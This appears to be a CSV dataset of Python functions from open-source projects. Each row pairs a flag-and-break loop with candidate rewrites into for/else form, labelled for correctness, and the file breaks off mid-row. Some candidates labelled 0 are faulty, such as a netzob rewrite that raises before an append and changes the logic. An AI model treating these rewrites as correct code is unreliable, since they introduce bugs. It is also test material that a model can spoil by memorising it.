Paddle,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Paddle/python/paddle/distributed/fleet/utils/fs.py,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/fleet/utils/fs.py,HDFSClient,mkdirs$874,"def mkdirs(self, fs_path):
        """"""
        Create a remote HDFS directory.

        Args:
            fs_path(str): The HDFS directory path.

        Examples:

            .. code-block:: text

                from paddle.distributed.fleet.utils import HDFSClient

                hadoop_home = ""/home/client/hadoop-client/hadoop/""
                configs = {
                    ""fs.default.name"": ""hdfs://xxx.hadoop.com:54310"",
                    ""hadoop.job.ugi"": ""hello,hello123""
                }

                client = HDFSClient(hadoop_home, configs)
                client.mkdirs(""hdfs:/test_hdfs_client"")
        """"""
        if self.is_exist(fs_path):
            return

        out_hdfs = False

        cmd = ""mkdir {} "".format(fs_path)
        ret, out = self._run_cmd(cmd, redirect_stderr=True)
        if ret != 0:
            for l in out:
                if ""No such file or directory"" in l:
                    out_hdfs = True
                    break
            if not out_hdfs:
                raise ExecuteError(cmd)

        if out_hdfs and not self.is_exist(fs_path):
            cmd = ""mkdir -p {}"".format(fs_path)
            ret, _ = self._run_cmd(cmd)
            if ret != 0:
                raise ExecuteError(cmd)","for l in out:
    if 'No such file or directory' in l:
        out_hdfs = True
        break
if not out_hdfs:
    raise ExecuteError(cmd)","for l in out:
    if 'No such file or directory' in l:
        out_hdfs = True
        break
else:
    raise ExecuteError(cmd)","for l in out:
    if 'No such file or directory' in l:
        break
else:
    raise ExecuteError(cmd)",0,"for l in out:
    if 'No such file or directory' in l:
        out_hdfs = True
        break
if not out_hdfs:
    raise ExecuteError(cmd)","break statement is executed:None
break statement is not executed:zejun1"
sunpy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sunpy/sunpy/net/helio/parser.py,https://github.com/sunpy/sunpy/tree/master/sunpy/net/helio/parser.py,,webservice_parser$23,"def webservice_parser(service='HEC'):
    """"""
    Quickly parses important contents from HELIO registry.

    Uses the link with 'service' appended and scrapes the web-service links contained on that webpage.

    Parameters
    ----------
    service : str
        Indicates which particular HELIO service is used. Defaults to HEC.

    Returns
    -------
    links: list or NoneType
        List of urls to registries containing WSDL endpoints.

    Examples
    --------
    >>> from sunpy.net.helio import parser
    >>> parser.webservice_parser()  # doctest: +REMOTE_DATA
    ['http://helio.mssl.ucl.ac.uk/helio-hec/HelioService',
    'http://msslkk.mssl.ucl.ac.uk/helio-hec/HelioService',
    'http://voparis-helio.obspm.fr/helio-hec/HelioService',
    'http://hec.helio-vo.eu/helio-hec/HelioService',
    'http://helio.mssl.ucl.ac.uk/helio-hec/HelioLongQueryService',
    'http://msslkk.mssl.ucl.ac.uk/helio-hec/HelioLongQueryService',
    'http://voparis-helio.obspm.fr/helio-hec/HelioLongQueryService',
    'http://hec.helio-vo.eu/helio-hec/HelioLongQueryService']
    """"""
    xml = None
    for REG_LINK in REG_LINKS:
        link = REG_LINK + service.lower()
        xml = link_test(link)
        if xml:
            break
    if xml is None:
        return None
    root = EL.fromstring(xml)
    links = []

    for interface in root.iter('interface'):
        service_type = interface.attrib
        key = list(service_type.keys())
        if len(key) > 0:
            value = service_type[key[0]]
            if value == 'vr:WebService':
                for url in interface.iter('accessURL'):
                    if url.text not in links:
                        links.append(url.text)
    return links","for REG_LINK in REG_LINKS:
    link = REG_LINK + service.lower()
    xml = link_test(link)
    if xml:
        break
if xml is None:
    return None","for REG_LINK in REG_LINKS:
    link = REG_LINK + service.lower()
    xml = link_test(link)
    if xml:
        break
else:
    return None","for REG_LINK in REG_LINKS:
    link = REG_LINK + service.lower()
    xml = link_test(link)
    if xml:
        break
else:
    return None",1,"for REG_LINK in REG_LINKS:
    link = REG_LINK + service.lower()
    xml = link_test(link)
    if xml:
        break
if xml is None:
    return None","break statement is executed:None
break statement is not executed:zejun1"
Krakatau,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Krakatau/Krakatau/java/structuring.py,https://github.com/Storyyeller/Krakatau/tree/master/Krakatau/java/structuring.py,,tryExtend$557,"def tryExtend(con, newblocks, xCSet, xUps, xDowns, removed):
        forcedup = con.forcedup | xUps
        forceddown = con.forceddown | xDowns
        assert con not in forceddown
        forcedup.discard(con)
        if forcedup & forceddown:
            return False

        body = con.lbound | newblocks
        ubound = con.ubound
        for tcon in forcedup:
            ubound &= tcon.lbound

        while 1:
            done = True
            parent, pscope = parents[con]
            # Ugly hack to work around the fact that try bodies are temporarily stored
            # in the main constraint, not its scopes
            while not body <= (parent if parent.tag == 'try' else pscope).lbound:
                # Try to extend parent rather than just failing
                if parent.tag == 'try' and parent in forcedup:
                    # Note this call may mutate the parent
                    done = not tryExtend(parent, body, ExceptionSet.EMPTY, set(), set(), removed)
                    # Since the tree may have been updated, start over and rewalk the tree
                    if not done:
                        break

                body |= parent.lbound
                if parent in forcedup or not body <= ubound:
                    return False
                parent, pscope = parents[parent]
            if done:
                break

        for child in children[parent]:
            if child.lbound.touches(body):
                body |= child.lbound
        if not body <= ubound:
            return False

        cset = con.cset | xCSet
        forbidden = con.forbidden.copy()
        for newdown in (forceddown - con.forceddown):
            unforbid(forbidden, newdown)
        assert all(forbidden.values())

        for node in body.nodes:
            if node in forbidden and (cset & forbidden[node]):
                # The current cset is not compatible with the current partial order
                # Try to find some cons to force down in order to fix this
                bad = cset & forbidden[node]
                candidates = [c for c in trycons if c not in removed]
                candidates = [c for c in candidates if node in c.lbound.nodes and c.lbound.issubset(body)]
                candidates = [c for c in candidates if (c.cset & bad)]
                candidates = [c for c in candidates if c not in forcedup and c is not con]

                for topnd in candidates:
                    if topnd in forceddown:
                        continue

                    temp = topnd.forceddown - forceddown - removed
                    temp.add(topnd)
                    for newdown in temp:
                        unforbid(forbidden, newdown)

                    assert con not in temp
                    forceddown |= temp
                    bad = cset & forbidden.get(node, ExceptionSet.EMPTY)
                    if not bad:
                        break
                if bad:
                    assert node not in con.lbound.nodes or cset - con.cset
                    return False
        assert forceddown.isdisjoint(forcedup)
        assert all(forbidden.values())
        for tcon in forceddown:
            assert tcon.lbound <= body

        # At this point, everything should be all right, so we need to update con and the tree
        con.lbound = body
        con.cset = cset
        con.forbidden = forbidden
        con.forcedup = forcedup
        con.forceddown = forceddown
        con.scopes[0].lbound = body
        con.scopes[0].ubound = ubound

        for new in con.forceddown:
            new.forcedup.add(con)
            new.forcedup |= forcedup

        for new in con.forcedup:
            unforbid(new.forbidden, con)
            for new2 in forceddown - new.forceddown:
                unforbid(new.forbidden, new2)
            new.forceddown.add(con)
            new.forceddown |= forceddown

        # Move con into it's new position in the tree
        removeFromTree(con)
        insertInTree(con, parent)
        return True","while not body <= (parent if parent.tag == 'try' else pscope).lbound:
    if parent.tag == 'try' and parent in forcedup:
        done = not tryExtend(parent, body, ExceptionSet.EMPTY, set(), set(), removed)
        if not done:
            break
    body |= parent.lbound
    if parent in forcedup or not body <= ubound:
        return False
    (parent, pscope) = parents[parent]
if done:
    break","while not body <= (parent if parent.tag == 'try' else pscope).lbound:
    if parent.tag == 'try' and parent in forcedup:
        done = not tryExtend(parent, body, ExceptionSet.EMPTY, set(), set(), removed)
        if not done:
            break
    body |= parent.lbound
    if parent in forcedup or not body <= ubound:
        return False
    (parent, pscope) = parents[parent]
else:
    break","while not body <= (parent if parent.tag == 'try' else pscope).lbound:
    if parent.tag == 'try' and parent in forcedup:
        done = not tryExtend(parent, body, ExceptionSet.EMPTY, set(), set(), removed)
        if not done:
            break
    body |= parent.lbound
    if parent in forcedup or not body <= ubound:
        return False
    (parent, pscope) = parents[parent]
else:
    break",1,"while not body <= (parent if parent.tag == 'try' else pscope).lbound:
    if parent.tag == 'try' and parent in forcedup:
        done = not tryExtend(parent, body, ExceptionSet.EMPTY, set(), set(), removed)
        if not done:
            break
    body |= parent.lbound
    if parent in forcedup or not body <= ubound:
        return False
    (parent, pscope) = parents[parent]
if done:
    break","break statement is executed:None
break statement is not executed:zejun1"
netzob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/netzob/netzob/src/netzob/Model/Vocabulary/Domain/Variables/Leafs/Size.py,https://github.com/netzob/netzob/tree/master/netzob/src/netzob/Model/Vocabulary/Domain/Variables/Leafs/Size.py,Size,_computeExpectedValue$283,"def _computeExpectedValue(self, parsingPath):
        self._logger.debug(""compute expected value for Size field"")

        # first checks the pointed fields all have a value
        hasNeededData = True
        size = 0
        remainingFields = []

        for field in self.fieldDependencies:

            if field.domain == self:
                remainingFields.append(field)
            else:

                # Retrieve the size of the targeted field, if it has a fixed size
                if hasattr(field.domain, ""dataType""):
                    minSize, maxSize = field.domain.dataType.size
                    if maxSize is not None and minSize == maxSize:
                        size += minSize
                        continue

                # Else, retrieve its value if it exists
                if parsingPath.isDataAvailableForVariable(field.domain):
                    remainingFields.append(field)
                else:
                    self._logger.debug(""The following field domain has no value: '{0}'"".format(field.domain))
                    hasNeededData = False
                    break

        if not hasNeededData:
            raise Exception(""Expected value cannot be computed, some dependencies are missing for domain {0}"".format(self))
        else:
            for field in remainingFields:

                # Retrieve field value
                if field.domain is self:
                    fieldValue = self.dataType.generate()
                else:
                    fieldValue = parsingPath.getDataAssignedToVariable(
                        field.domain)
                if fieldValue is None:
                    break

                # Retrieve length of field value
                size += len(fieldValue)

        size = int(size * self.factor + self.offset)
        size_raw = TypeConverter.convert(size,
                                         Integer,
                                         Raw,
                                         src_unitSize=self.dataType.unitSize,
                                         dst_unitSize=self.dataType.unitSize,
                                         src_sign=self.dataType.sign,
                                         dst_sign=self.dataType.sign,
                                         src_endianness=self.dataType.endianness,
                                         dst_endianness=self.dataType.endianness)
        b = TypeConverter.convert(size_raw, Raw, BitArray)

        # add heading '0'
        while len(b) < self.dataType.size[0]:
            b.insert(0, False)

        # in some cases (when unitSize and size are not equal), it may require to delete some '0' in front
        while len(b) > self.dataType.size[0]:
            b.remove(0)

        self._logger.debug(""computed value for Size field: '{}'"".format(b))
        return b","for field in self.fieldDependencies:
    if field.domain == self:
        remainingFields.append(field)
    else:
        if hasattr(field.domain, 'dataType'):
            (minSize, maxSize) = field.domain.dataType.size
            if maxSize is not None and minSize == maxSize:
                size += minSize
                continue
        if parsingPath.isDataAvailableForVariable(field.domain):
            remainingFields.append(field)
        else:
            self._logger.debug(""The following field domain has no value: '{0}'"".format(field.domain))
            hasNeededData = False
            break
if not hasNeededData:
    raise Exception('Expected value cannot be computed, some dependencies are missing for domain {0}'.format(self))
else:
    for field in remainingFields:
        if field.domain is self:
            fieldValue = self.dataType.generate()
        else:
            fieldValue = parsingPath.getDataAssignedToVariable(field.domain)
        if fieldValue is None:
            break
        size += len(fieldValue)","for field in self.fieldDependencies:
    if field.domain == self:
        remainingFields.append(field)
    else:
        if hasattr(field.domain, 'dataType'):
            (minSize, maxSize) = field.domain.dataType.size
            if maxSize is not None and minSize == maxSize:
                size += minSize
                continue
        if parsingPath.isDataAvailableForVariable(field.domain):
            remainingFields.append(field)
        else:
            self._logger.debug(""The following field domain has no value: '{0}'"".format(field.domain))
            for field in remainingFields:
                if field.domain is self:
                    fieldValue = self.dataType.generate()
                else:
                    fieldValue = parsingPath.getDataAssignedToVariable(field.domain)
                if fieldValue is None:
                    break
                size += len(fieldValue)
            break
else:
    raise Exception('Expected value cannot be computed, some dependencies are missing for domain {0}'.format(self))","for field in self.fieldDependencies:
    if field.domain == self:
        remainingFields.append(field)
    else:
        if hasattr(field.domain, 'dataType'):
            (minSize, maxSize) = field.domain.dataType.size
            if maxSize is not None and minSize == maxSize:
                size += minSize
                continue
        if parsingPath.isDataAvailableForVariable(field.domain):
            raise Exception('Expected value cannot be computed, some dependencies are missing for domain {0}'.format(self))
            remainingFields.append(field)
        else:
            self._logger.debug(""The following field domain has no value: '{0}'"".format(field.domain))
            break
else:
    for field in remainingFields:
        if field.domain is self:
            fieldValue = self.dataType.generate()
        else:
            fieldValue = parsingPath.getDataAssignedToVariable(field.domain)
        if fieldValue is None:
            break
        size += len(fieldValue)",0,"for field in self.fieldDependencies:
    if field.domain == self:
        remainingFields.append(field)
    else:
        if hasattr(field.domain, 'dataType'):
            (minSize, maxSize) = field.domain.dataType.size
            if maxSize is not None and minSize == maxSize:
                size += minSize
                continue
        if parsingPath.isDataAvailableForVariable(field.domain):
            remainingFields.append(field)
        else:
            self._logger.debug(""The following field domain has no value: '{0}'"".format(field.domain))
            hasNeededData = False
            break
if not hasNeededData:
    raise Exception('Expected value cannot be computed, some dependencies are missing for domain {0}'.format(self))
else:
    for field in remainingFields:
        if field.domain is self:
            fieldValue = self.dataType.generate()
        else:
            fieldValue = parsingPath.getDataAssignedToVariable(field.domain)
        if fieldValue is None:
            break
        size += len(fieldValue)","break statement is executed:None
break statement is not executed:zejun1"
AzurLaneAutoScript,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/AzurLaneAutoScript/module/guild/operations.py,https://github.com/LmeSzinc/AzurLaneAutoScript/tree/master/module/guild/operations.py,GuildOperations,_guild_operations_dispatch$398,"def _guild_operations_dispatch(self):
        """"""
        Run guild dispatch

        Pages:
            in: page_guild, guild operation, operation map (GUILD_OPERATIONS_ACTIVE_CHECK)
            out: page_guild, guild operation, operation map (GUILD_OPERATIONS_ACTIVE_CHECK)
        """"""
        logger.hr('Guild dispatch')
        success = False
        for _ in reversed(range(2)):
            if self._guild_operations_dispatch_swipe(forward=_):
                success = True
                break
            if _:
                self.guild_side_navbar_ensure(bottom=2)
                self.guild_side_navbar_ensure(bottom=1)
                self._guild_operations_ensure()
        if not success:
            return False

        for _ in range(5):
            if self._guild_operations_dispatch_enter():
                self._guild_operations_dispatch_switch_fleet()
                self._guild_operations_dispatch_execute()
                self._guild_operations_dispatch_exit()
            else:
                return True

        logger.warning('Too many trials on guild operation dispatch')
        return False","for _ in reversed(range(2)):
    if self._guild_operations_dispatch_swipe(forward=_):
        success = True
        break
    if _:
        self.guild_side_navbar_ensure(bottom=2)
        self.guild_side_navbar_ensure(bottom=1)
        self._guild_operations_ensure()
if not success:
    return False","for _ in reversed(range(2)):
    if self._guild_operations_dispatch_swipe(forward=_):
        break
    if _:
        self.guild_side_navbar_ensure(bottom=2)
        self.guild_side_navbar_ensure(bottom=1)
        self._guild_operations_ensure()
else:
    return False","for _ in reversed(range(2)):
    if self._guild_operations_dispatch_swipe(forward=_):
        break
    if _:
        self.guild_side_navbar_ensure(bottom=2)
        self.guild_side_navbar_ensure(bottom=1)
        self._guild_operations_ensure()
else:
    return False",1,"for _ in reversed(range(2)):
    if self._guild_operations_dispatch_swipe(forward=_):
        success = True
        break
    if _:
        self.guild_side_navbar_ensure(bottom=2)
        self.guild_side_navbar_ensure(bottom=1)
        self._guild_operations_ensure()
if not success:
    return False","break statement is executed:None
break statement is not executed:zejun1"
wifiphisher,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/wifiphisher/wifiphisher/common/phishingpage.py,https://github.com/wifiphisher/wifiphisher/tree/master/wifiphisher/common/phishingpage.py,TemplateManager,is_valid_template$334,"def is_valid_template(self, name):
        """"""
        Validate the template
        :param self: A TemplateManager object
        :param name: A directory name
        :type self: A TemplateManager object
        :return: tuple of is_valid and output string
        :rtype: tuple
        """"""

        html = False
        dir_path = os.path.join(self._template_directory, name)
        # check config file...
        if not ""config.ini"" in os.listdir(dir_path):
            return False, ""Configuration file not found in: ""
        try:
            tdir = os.listdir(os.path.join(dir_path, constants.SCENARIO_HTML_DIR))
        except OSError:
            return False, ""No "" + constants.SCENARIO_HTML_DIR + "" directory found in: ""
        # Check HTML files...
        for tfile in tdir:
            if tfile.endswith("".html""):
                html = True
                break
        if not html:
            return False, ""No HTML files found in: ""
        # and if we found them all return true and template directory name
        return True, name","for tfile in tdir:
    if tfile.endswith('.html'):
        html = True
        break
if not html:
    return (False, 'No HTML files found in: ')","for tfile in tdir:
    if tfile.endswith('.html'):
        break
else:
    return (False, 'No HTML files found in: ')","for tfile in tdir:
    if tfile.endswith('.html'):
        break
else:
    return (False, 'No HTML files found in: ')",1,"for tfile in tdir:
    if tfile.endswith('.html'):
        html = True
        break
if not html:
    return (False, 'No HTML files found in: ')","break statement is executed:None
break statement is not executed:zejun1"
python-saml,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/python-saml/src/onelogin/saml2/response.py,https://github.com/onelogin/python-saml/tree/master/src/onelogin/saml2/response.py,OneLogin_Saml2_Response,is_valid$55,"def is_valid(self, request_data, request_id=None, raise_exceptions=False):
        """"""
        Validates the response object.

        :param request_data: Request Data
        :type request_data: dict

        :param request_id: Optional argument. The ID of the AuthNRequest sent by this SP to the IdP
        :type request_id: string

        :param raise_exceptions: Whether to return false on failure or raise an exception
        :type raise_exceptions: Boolean

        :returns: True if the SAML Response is valid, False if not
        :rtype: bool
        """"""
        self.__error = None
        try:
            # Checks SAML version
            if self.document.get('Version', None) != '2.0':
                raise OneLogin_Saml2_ValidationError(
                    'Unsupported SAML version',
                    OneLogin_Saml2_ValidationError.UNSUPPORTED_SAML_VERSION
                )

            # Checks that ID exists
            if self.document.get('ID', None) is None:
                raise OneLogin_Saml2_ValidationError(
                    'Missing ID attribute on SAML Response',
                    OneLogin_Saml2_ValidationError.MISSING_ID
                )

            # Checks that the response has the SUCCESS status
            self.check_status()

            # Checks that the response only has one assertion
            if not self.validate_num_assertions():
                raise OneLogin_Saml2_ValidationError(
                    'SAML Response must contain 1 assertion',
                    OneLogin_Saml2_ValidationError.WRONG_NUMBER_OF_ASSERTIONS
                )

            idp_data = self.__settings.get_idp_data()
            idp_entity_id = idp_data.get('entityId', '')
            sp_data = self.__settings.get_sp_data()
            sp_entity_id = sp_data.get('entityId', '')

            signed_elements = self.process_signed_elements()

            has_signed_response = '{%s}Response' % OneLogin_Saml2_Constants.NS_SAMLP in signed_elements
            has_signed_assertion = '{%s}Assertion' % OneLogin_Saml2_Constants.NS_SAML in signed_elements

            security = self.__settings.get_security_data()
            if self.__settings.is_strict():
                no_valid_xml_msg = 'Invalid SAML Response. Not match the saml-schema-protocol-2.0.xsd'
                res = OneLogin_Saml2_Utils.validate_xml(
                    tostring(self.document),
                    'saml-schema-protocol-2.0.xsd',
                    self.__settings.is_debug_active()
                )
                if not isinstance(res, Document):
                    raise OneLogin_Saml2_ValidationError(
                        no_valid_xml_msg,
                        OneLogin_Saml2_ValidationError.INVALID_XML_FORMAT
                    )

                # If encrypted, check also the decrypted document
                if self.encrypted:
                    res = OneLogin_Saml2_Utils.validate_xml(
                        tostring(self.decrypted_document),
                        'saml-schema-protocol-2.0.xsd',
                        self.__settings.is_debug_active()
                    )
                    if not isinstance(res, Document):
                        raise OneLogin_Saml2_ValidationError(
                            no_valid_xml_msg,
                            OneLogin_Saml2_ValidationError.INVALID_XML_FORMAT
                        )

                current_url = OneLogin_Saml2_Utils.get_self_url_no_query(request_data)

                in_response_to = self.get_in_response_to()
                if request_id is None and in_response_to is not None and security.get('rejectUnsolicitedResponsesWithInResponseTo', False):
                    raise OneLogin_Saml2_ValidationError(
                        'The Response has an InResponseTo attribute: %s while no InResponseTo was expected' % in_response_to,
                        OneLogin_Saml2_ValidationError.WRONG_INRESPONSETO
                    )

                # Check if the InResponseTo of the Response matchs the ID of the AuthNRequest (requestId) if provided
                if request_id is not None and in_response_to != request_id:
                    raise OneLogin_Saml2_ValidationError(
                        'The InResponseTo of the Response: %s, does not match the ID of the AuthNRequest sent by the SP: %s' % (in_response_to, request_id),
                        OneLogin_Saml2_ValidationError.WRONG_INRESPONSETO
                    )

                if not self.encrypted and security.get('wantAssertionsEncrypted', False):
                    raise OneLogin_Saml2_ValidationError(
                        'The assertion of the Response is not encrypted and the SP require it',
                        OneLogin_Saml2_ValidationError.NO_ENCRYPTED_ASSERTION
                    )

                if security.get('wantNameIdEncrypted', False):
                    encrypted_nameid_nodes = self.__query_assertion('/saml:Subject/saml:EncryptedID/xenc:EncryptedData')
                    if len(encrypted_nameid_nodes) != 1:
                        raise OneLogin_Saml2_ValidationError(
                            'The NameID of the Response is not encrypted and the SP require it',
                            OneLogin_Saml2_ValidationError.NO_ENCRYPTED_NAMEID
                        )

                # Checks that a Conditions element exists
                if not self.check_one_condition():
                    raise OneLogin_Saml2_ValidationError(
                        'The Assertion must include a Conditions element',
                        OneLogin_Saml2_ValidationError.MISSING_CONDITIONS
                    )

                # Validates Assertion timestamps
                self.validate_timestamps(raise_exceptions=True)

                # Checks that an AuthnStatement element exists and is unique
                if not self.check_one_authnstatement():
                    raise OneLogin_Saml2_ValidationError(
                        'The Assertion must include an AuthnStatement element',
                        OneLogin_Saml2_ValidationError.WRONG_NUMBER_OF_AUTHSTATEMENTS
                    )

                # Checks that the response has all of the AuthnContexts that we provided in the request.
                # Only check if failOnAuthnContextMismatch is true and requestedAuthnContext is set to a list.
                requested_authn_contexts = security.get('requestedAuthnContext', True)

                if security.get('failOnAuthnContextMismatch', False) and requested_authn_contexts and requested_authn_contexts is not True:
                    authn_contexts = self.get_authn_contexts()
                    unmatched_contexts = set(authn_contexts).difference(requested_authn_contexts)
                    if unmatched_contexts:
                        raise OneLogin_Saml2_ValidationError(
                            'The AuthnContext ""%s"" was not a requested context ""%s""' % (', '.join(unmatched_contexts), ', '.join(requested_authn_contexts)),
                            OneLogin_Saml2_ValidationError.AUTHN_CONTEXT_MISMATCH
                        )

                # Checks that there is at least one AttributeStatement if required
                attribute_statement_nodes = self.__query_assertion('/saml:AttributeStatement')
                if security.get('wantAttributeStatement', True) and not attribute_statement_nodes:
                    raise OneLogin_Saml2_ValidationError(
                        'There is no AttributeStatement on the Response',
                        OneLogin_Saml2_ValidationError.NO_ATTRIBUTESTATEMENT
                    )

                encrypted_attributes_nodes = self.__query_assertion('/saml:AttributeStatement/saml:EncryptedAttribute')
                if encrypted_attributes_nodes:
                    raise OneLogin_Saml2_ValidationError(
                        'There is an EncryptedAttribute in the Response and this SP not support them',
                        OneLogin_Saml2_ValidationError.ENCRYPTED_ATTRIBUTES
                    )

                # Checks destination
                destination = self.document.get('Destination', None)
                if destination:
                    if not OneLogin_Saml2_Utils.normalize_url(url=destination).startswith(OneLogin_Saml2_Utils.normalize_url(url=current_url)):
                        # TODO: Review if following lines are required, since we can control the
                        # request_data
                        #  current_url_routed = OneLogin_Saml2_Utils.get_self_routed_url_no_query(request_data)
                        #  if not destination.startswith(current_url_routed):
                        raise OneLogin_Saml2_ValidationError(
                            'The response was received at %s instead of %s' % (current_url, destination),
                            OneLogin_Saml2_ValidationError.WRONG_DESTINATION
                        )
                elif destination == '':
                    raise OneLogin_Saml2_ValidationError(
                        'The response has an empty Destination value',
                        OneLogin_Saml2_ValidationError.EMPTY_DESTINATION
                    )

                # Checks audience
                valid_audiences = self.get_audiences()
                if valid_audiences and sp_entity_id not in valid_audiences:
                    raise OneLogin_Saml2_ValidationError(
                        '%s is not a valid audience for this Response' % sp_entity_id,
                        OneLogin_Saml2_ValidationError.WRONG_AUDIENCE
                    )

                # Checks the issuers
                issuers = self.get_issuers()
                for issuer in issuers:
                    if issuer is None or issuer != idp_entity_id:
                        raise OneLogin_Saml2_ValidationError(
                            'Invalid issuer in the Assertion/Response (expected %(idpEntityId)s, got %(issuer)s)' %
                            {
                                'idpEntityId': idp_entity_id,
                                'issuer': issuer
                            },
                            OneLogin_Saml2_ValidationError.WRONG_ISSUER
                        )

                # Checks the session Expiration
                session_expiration = self.get_session_not_on_or_after()
                if session_expiration and session_expiration <= OneLogin_Saml2_Utils.now():
                    raise OneLogin_Saml2_ValidationError(
                        'The attributes have expired, based on the SessionNotOnOrAfter of the AttributeStatement of this Response',
                        OneLogin_Saml2_ValidationError.SESSION_EXPIRED
                    )

                # Checks the SubjectConfirmation, at least one SubjectConfirmation must be valid
                any_subject_confirmation = False
                subject_confirmation_nodes = self.__query_assertion('/saml:Subject/saml:SubjectConfirmation')

                for scn in subject_confirmation_nodes:
                    method = scn.get('Method', None)
                    if method and method != OneLogin_Saml2_Constants.CM_BEARER:
                        continue
                    sc_data = scn.find('saml:SubjectConfirmationData', namespaces=OneLogin_Saml2_Constants.NSMAP)
                    if sc_data is None:
                        continue
                    else:
                        irt = sc_data.get('InResponseTo', None)
                        if (in_response_to is None and irt is not None and
                           security.get('rejectUnsolicitedResponsesWithInResponseTo', False)) or \
                           in_response_to and irt and irt != in_response_to:
                            continue
                        recipient = sc_data.get('Recipient', None)
                        if recipient and current_url not in recipient:
                            continue
                        nooa = sc_data.get('NotOnOrAfter', None)
                        if nooa:
                            parsed_nooa = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
                            if parsed_nooa <= OneLogin_Saml2_Utils.now():
                                continue
                        nb = sc_data.get('NotBefore', None)
                        if nb:
                            parsed_nb = OneLogin_Saml2_Utils.parse_SAML_to_time(nb)
                            if parsed_nb > OneLogin_Saml2_Utils.now():
                                continue

                        if nooa:
                            self.valid_scd_not_on_or_after = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)

                        any_subject_confirmation = True
                        break

                if not any_subject_confirmation:
                    raise OneLogin_Saml2_ValidationError(
                        'A valid SubjectConfirmation was not found on this Response',
                        OneLogin_Saml2_ValidationError.WRONG_SUBJECTCONFIRMATION
                    )

                if security.get('wantAssertionsSigned', False) and not has_signed_assertion:
                    raise OneLogin_Saml2_ValidationError(
                        'The Assertion of the Response is not signed and the SP require it',
                        OneLogin_Saml2_ValidationError.NO_SIGNED_ASSERTION
                    )

                if security.get('wantMessagesSigned', False) and not has_signed_response:
                    raise OneLogin_Saml2_ValidationError(
                        'The Message of the Response is not signed and the SP require it',
                        OneLogin_Saml2_ValidationError.NO_SIGNED_MESSAGE
                    )

            if not signed_elements or (not has_signed_response and not has_signed_assertion):
                raise OneLogin_Saml2_ValidationError(
                    'No Signature found. SAML Response rejected',
                    OneLogin_Saml2_ValidationError.NO_SIGNATURE_FOUND
                )
            else:
                cert = idp_data.get('x509cert', None)
                fingerprint = idp_data.get('certFingerprint', None)
                fingerprintalg = idp_data.get('certFingerprintAlgorithm', None)

                multicerts = None
                if 'x509certMulti' in idp_data and 'signing' in idp_data['x509certMulti'] and idp_data['x509certMulti']['signing']:
                    multicerts = idp_data['x509certMulti']['signing']

                # If find a Signature on the Response, validates it checking the original response
                if has_signed_response and not OneLogin_Saml2_Utils.validate_sign(self.document, cert, fingerprint, fingerprintalg, xpath=OneLogin_Saml2_Utils.RESPONSE_SIGNATURE_XPATH, multicerts=multicerts, raise_exceptions=False):
                    raise OneLogin_Saml2_ValidationError(
                        'Signature validation failed. SAML Response rejected',
                        OneLogin_Saml2_ValidationError.INVALID_SIGNATURE
                    )

                document_check_assertion = self.decrypted_document if self.encrypted else self.document
                if has_signed_assertion and not OneLogin_Saml2_Utils.validate_sign(document_check_assertion, cert, fingerprint, fingerprintalg, xpath=OneLogin_Saml2_Utils.ASSERTION_SIGNATURE_XPATH, multicerts=multicerts, raise_exceptions=False):
                    raise OneLogin_Saml2_ValidationError(
                        'Signature validation failed. SAML Response rejected',
                        OneLogin_Saml2_ValidationError.INVALID_SIGNATURE
                    )

            return True
        except Exception as err:
            self.__error = err.__str__()
            debug = self.__settings.is_debug_active()
            if debug:
                print(err.__str__())
            if raise_exceptions:
                raise err
            return False","for scn in subject_confirmation_nodes:
    method = scn.get('Method', None)
    if method and method != OneLogin_Saml2_Constants.CM_BEARER:
        continue
    sc_data = scn.find('saml:SubjectConfirmationData', namespaces=OneLogin_Saml2_Constants.NSMAP)
    if sc_data is None:
        continue
    else:
        irt = sc_data.get('InResponseTo', None)
        if in_response_to is None and irt is not None and security.get('rejectUnsolicitedResponsesWithInResponseTo', False) or (in_response_to and irt and (irt != in_response_to)):
            continue
        recipient = sc_data.get('Recipient', None)
        if recipient and current_url not in recipient:
            continue
        nooa = sc_data.get('NotOnOrAfter', None)
        if nooa:
            parsed_nooa = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
            if parsed_nooa <= OneLogin_Saml2_Utils.now():
                continue
        nb = sc_data.get('NotBefore', None)
        if nb:
            parsed_nb = OneLogin_Saml2_Utils.parse_SAML_to_time(nb)
            if parsed_nb > OneLogin_Saml2_Utils.now():
                continue
        if nooa:
            self.valid_scd_not_on_or_after = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
        any_subject_confirmation = True
        break
if not any_subject_confirmation:
    raise OneLogin_Saml2_ValidationError('A valid SubjectConfirmation was not found on this Response', OneLogin_Saml2_ValidationError.WRONG_SUBJECTCONFIRMATION)","for scn in subject_confirmation_nodes:
    method = scn.get('Method', None)
    if method and method != OneLogin_Saml2_Constants.CM_BEARER:
        continue
    sc_data = scn.find('saml:SubjectConfirmationData', namespaces=OneLogin_Saml2_Constants.NSMAP)
    if sc_data is None:
        continue
    else:
        irt = sc_data.get('InResponseTo', None)
        if in_response_to is None and irt is not None and security.get('rejectUnsolicitedResponsesWithInResponseTo', False) or (in_response_to and irt and (irt != in_response_to)):
            continue
        recipient = sc_data.get('Recipient', None)
        if recipient and current_url not in recipient:
            continue
        nooa = sc_data.get('NotOnOrAfter', None)
        if nooa:
            parsed_nooa = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
            if parsed_nooa <= OneLogin_Saml2_Utils.now():
                continue
        nb = sc_data.get('NotBefore', None)
        if nb:
            parsed_nb = OneLogin_Saml2_Utils.parse_SAML_to_time(nb)
            if parsed_nb > OneLogin_Saml2_Utils.now():
                continue
        if nooa:
            self.valid_scd_not_on_or_after = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
        break
else:
    raise OneLogin_Saml2_ValidationError('A valid SubjectConfirmation was not found on this Response', OneLogin_Saml2_ValidationError.WRONG_SUBJECTCONFIRMATION)","for scn in subject_confirmation_nodes:
    method = scn.get('Method', None)
    if method and method != OneLogin_Saml2_Constants.CM_BEARER:
        continue
